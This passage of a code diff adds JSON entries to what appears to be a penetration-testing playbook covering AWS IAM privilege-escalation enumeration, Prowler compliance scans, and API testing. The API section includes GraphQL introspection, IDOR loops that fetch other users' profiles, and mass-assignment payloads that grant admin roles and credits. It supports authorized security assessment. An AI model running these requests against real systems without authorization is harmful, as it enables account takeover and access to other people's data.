+            "cmd": "# Who am I? (ALWAYS first command):\naws sts get-caller-identity\n\n# List attached policies:\naws iam list-attached-user-policies --user-name {USERNAME}\naws iam list-user-policies --user-name {USERNAME}\naws iam list-groups-for-user --user-name {USERNAME}\n\n# Get policy document (what can I actually do?):\naws iam get-policy-version \\\n  --policy-arn {POLICY_ARN} \\\n  --version-id v1\n\n# Automated enumeration with Pacu:\npython3 pacu.py\n# Pacu commands:\n# > import_keys {PROFILE_NAME}\n# > run iam__enum_permissions\n# > run iam__privesc_scan",
+            "example": "aws sts get-caller-identity && aws iam list-attached-user-policies --user-name dev-user",
+            "flags": [
+              {
+                "f": "iam__enum_permissions",
+                "d": "Pacu: full IAM permission enumeration"
+              },
+              {
+                "f": "iam__privesc_scan",
+                "d": "Pacu: automated privesc path detection"
+              }
+            ],
+            "note": "Document EVERY permission before attempting escalation. Noisy IAM calls are logged in CloudTrail.",
+            "out": "Full permission list + identified escalation paths"
+          },
+          {
+            "id": "cl2c2",
+            "title": "Prowler Compliance & Security Scan",
+            "purpose": "CIS Benchmark, GDPR, HIPAA, SOC2 checks for AWS",
+            "cmd": "# Full compliance scan:\nprowler aws -f {REGION} -M html,json -o ~/pentests/{CLIENT}/cloud/prowler/\n\n# Specific high-value checks:\nprowler aws --checks \\\n  iam_root_mfa_enabled \\\n  iam_user_no_setup_initial_access_key \\\n  s3_bucket_public_access \\\n  ec2_securitygroup_default_restrict_traffic \\\n  cloudtrail_multi_region_enabled\n\n# List all available checks:\nprowler aws --list-checks",
+            "example": "prowler aws -f us-east-1 -M html -o ./prowler-output/",
+            "flags": [
+              {
+                "f": "-M html,json",
+                "d": "Multiple output formats"
+              },
+              {
+                "f": "--checks",
+                "d": "Run specific checks only"
+              },
+              {
+                "f": "-f",
+                "d": "AWS region to scan"
+              }
+            ],
+            "note": "Over 300 checks. CIS, GDPR, PCI-DSS, HIPAA, SOC2 frameworks all supported. Essential for compliance-focused clients.",
+            "out": "Pass/Fail for each control with severity + remediation guidance"
+          }
+        ],
+        "tools": [
+          "aws-cli",
+          "Pacu",
+          "Prowler",
+          "azure-cli"
+        ],
+        "deliverable": "IAM privilege escalation paths, compliance report, remediation roadmap",
+        "tip": "iam:PassRole is the #1 AWS privilege escalation path. If you can pass a role with AdministratorAccess to a Lambda function you control, you own the account silently."
+      }
+    ]
+  },
+  {
+    "id": "api",
+    "label": "API Security",
+    "short": "API",
+    "icon": "\ud83d\udd0c",
+    "color": "#a855f7",
+    "desc": "REST, GraphQL, SOAP \u2014 OWASP API Top 10 systematic assessment",
+    "steps": [
+      {
+        "id": "api1",
+        "title": "API Discovery & Mapping",
+        "priority": "high",
+        "summary": "Enumerate all API endpoints, auth mechanisms, and data flows before testing.",
+        "checklist": [
+          "Find Swagger/OpenAPI documentation",
+          "Enumerate endpoints from JS files and responses",
+          "Identify authentication: JWT, OAuth, API key, session",
+          "Find versioned endpoints (v1, v2, v3 \u2014 old versions often less patched)",
+          "Map all HTTP methods per endpoint",
+          "Check for GraphQL introspection",
+          "Identify rate limiting behavior",
+          "Document request/response schemas"
+        ],
+        "commands": [
+          {
+            "id": "api1c1",
+            "title": "API Endpoint Discovery",
+            "purpose": "Find all API endpoints via automated and manual techniques",
+            "cmd": "# Extract endpoints from JavaScript files:\ngau {DOMAIN} | grep -iE 'api|/v[0-9]|swagger|openapi|graphql'\n\n# Kiterunner \u2014 API-aware discovery:\nkr scan https://{TARGET}/api/ \\\n  -w ~/tools/kiterunner/routes-large.kite \\\n  -x 20 --fail-status-codes 404,400\n\n# ffuf for API paths:\nffuf -u https://{TARGET}/api/FUZZ \\\n  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \\\n  -mc 200,201,204,400,401,403,405 -of csv -o api_endpoints.csv\n\n# Check for documentation:\ncurl -sk https://{TARGET}/swagger.json\ncurl -sk https://{TARGET}/openapi.yaml\ncurl -sk https://{TARGET}/api-docs",
+            "example": "kr scan https://api.target.com -w routes-large.kite -x 20",
+            "flags": [
+              {
+                "f": "-x 20",
+                "d": "20 concurrent threads"
+              },
+              {
+                "f": "--fail-status-codes",
+                "d": "Ignore these status codes in results"
+              },
+              {
+                "f": "-mc",
+                "d": "Match these status codes only (401/403 = endpoint exists but requires auth)"
+              }
+            ],
+            "note": "401 and 403 responses are valuable finds \u2014 the endpoint exists. 405 = wrong method, try GET/POST/PUT/DELETE.",
+            "out": "Full endpoint inventory with status codes and methods"
+          },
+          {
+            "id": "api1c2",
+            "title": "GraphQL Security Testing",
+            "purpose": "Test introspection, injection, batching, and authorization on GraphQL APIs",
+            "cmd": "# Test if introspection enabled (massive info leak):\ncurl -s -X POST https://{TARGET}/graphql \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"{__schema{types{name fields{name}}}}\"}'  \n\n# graphql-cop full audit:\ngraphql-cop -t https://{TARGET}/graphql -v\n\n# Introspection to map all queries/mutations:\npython3 -c \"\nimport requests,json\nr=requests.post('https://{TARGET}/graphql',\n  json={'query':'{__schema{queryType{name}mutationType{name}types{name kind fields{name type{name kind}}}}}'},\n  verify=False)\nprint(json.dumps(r.json(),indent=2))\n\"",
+            "example": "graphql-cop -t https://api.target.com/graphql -v -o json",
+            "flags": [
+              {
+                "f": "__schema",
+                "d": "Full schema introspection \u2014 lists every query, mutation, type"
+              },
+              {
+                "f": "-v",
+                "d": "Verbose output with detailed findings"
+              },
+              {
+                "f": "-o json",
+                "d": "JSON output for reporting"
+              }
+            ],
+            "note": "Introspection enabled in production = OWASP API9 violation. Gives attacker complete API blueprint.",
+            "out": "All queries/mutations/types if introspection enabled + security issues found"
+          }
+        ],
+        "tools": [
+          "Kiterunner",
+          "ffuf",
+          "graphql-cop",
+          "Burp Suite Pro"
+        ],
+        "deliverable": "Complete API inventory with auth mapping and versioning matrix",
+        "tip": "Check old API versions: if /api/v2/users is the current endpoint, /api/v1/users might still work \u2014 and v1 often has weaker authorization."
+      },
+      {
+        "id": "api2",
+        "title": "OWASP API Top 10 Assessment",
+        "priority": "critical",
+        "summary": "Systematically test all 10 OWASP API security categories with specific payloads.",
+        "checklist": [
+          "API1:2023 BOLA \u2014 Test IDOR on all object IDs (change user ID, order ID, etc.)",
+          "API2:2023 Broken Auth \u2014 Test JWT attacks, weak secrets, missing expiry",
+          "API3:2023 BOPLA \u2014 Mass assignment via extra fields in POST/PUT body",
+          "API4:2023 Resource Consumption \u2014 Rate limiting, no pagination limits",
+          "API5:2023 BFLA \u2014 Access admin-level functions as regular user",
+          "API6:2023 Unrestricted Access \u2014 Business logic bypass",
+          "API7:2023 SSRF \u2014 URL parameters that trigger server-side requests",
+          "API8:2023 Misconfiguration \u2014 CORS, debug endpoints, verbose errors",
+          "API9:2023 Improper Inventory \u2014 Deprecated versions still accessible",
+          "API10:2023 Unsafe API Consumption \u2014 Trust in third-party APIs"
+        ],
+        "commands": [
+          {
+            "id": "api2c1",
+            "title": "BOLA / IDOR Testing (API1)",
+            "purpose": "Access other users objects by manipulating IDs",
+            "cmd": "# Capture your auth token, then access other users' data:\n\n# Sequential ID test:\nfor id in $(seq 1 100); do\n  curl -s -o /dev/null -w \"%{http_code} $id\\n\" \\\n    -H 'Authorization: Bearer {YOUR_TOKEN}' \\\n    https://{TARGET}/api/v1/users/$id/profile\ndone\n\n# GUID/UUID test (get another user's UUID from any leak):\ncurl -H 'Authorization: Bearer {YOUR_TOKEN}' \\\n  https://{TARGET}/api/v1/orders/{OTHER_USER_UUID}\n\n# Horizontal privilege escalation:\ncurl -H 'Authorization: Bearer {USER_A_TOKEN}' \\\n  https://{TARGET}/api/v1/users/{USER_B_ID}/documents",
+            "example": "curl -H 'Authorization: Bearer eyJ...' https://api.target.com/v1/users/1337/profile",
+            "flags": [
+              {
+                "f": "",
+                "d": "Test numeric IDs, GUIDs, usernames, email as identifiers"
+              },
+              {
+                "f": "",
+                "d": "Test all HTTP methods: GET, PUT, DELETE on other users objects"
+              }
+            ],
+            "note": "BOLA/IDOR is the #1 API vulnerability by frequency. Every object endpoint must be tested.",
+            "out": "200 OK with another users data = Critical BOLA finding"
+          },
+          {
+            "id": "api2c2",
+            "title": "Mass Assignment Testing (API3)",
+            "purpose": "Add unauthorized fields to API requests to escalate privileges",
+            "cmd": "# Registration \u2014 add admin flag:\ncurl -s -X POST https://{TARGET}/api/v1/register \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"username\":\"test\",\"password\":\"Test123!\",\n       \"admin\":true,\"role\":\"admin\",\"isVerified\":true}'\n\n# Profile update \u2014 add credit/balance:\ncurl -s -X PUT https://{TARGET}/api/v1/users/{USER_ID} \\\n  -H 'Authorization: Bearer {TOKEN}' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"email\":\"new@test.com\",\"isAdmin\":true,\"credits\":99999,\"planTier\":\"enterprise\"}'\n\n# Use Burp Param Miner to find hidden parameters automatically",
+            "example": "curl -X POST https://api.target.com/register -d '{\"username\":\"h4x\",\"role\":\"admin\"}'",
+            "flags": [
+              {
+                "f": "",
+                "d": "Fields to try: admin, isAdmin, role, credits, balance, verified, approved, planTier"
+              },
+              {
+                "f": "",
+                "d": "Check response body \u2014 does it echo back the field you sent?"
+              }
+            ],
+            "note": "If the server echoes back admin:true or role:admin in the response, the assignment succeeded.",
+            "out": "Elevated role or credits in response = Mass Assignment (High/Critical)"
+          }
+        ],
+        "tools": [
+          "Burp Suite Pro",
+          "curl",
+          "Postman",
+          "Param Miner (Burp ext.)"
+        ],
+        "deliverable": "OWASP API Top 10 assessment with PoC for each finding",
+        "tip": "Install Burp extension 'Param Miner' \u2014 it discovers hidden parameters in seconds. This finds mass assignment candidates automatically."
+      }
+    ]
+  }
+]
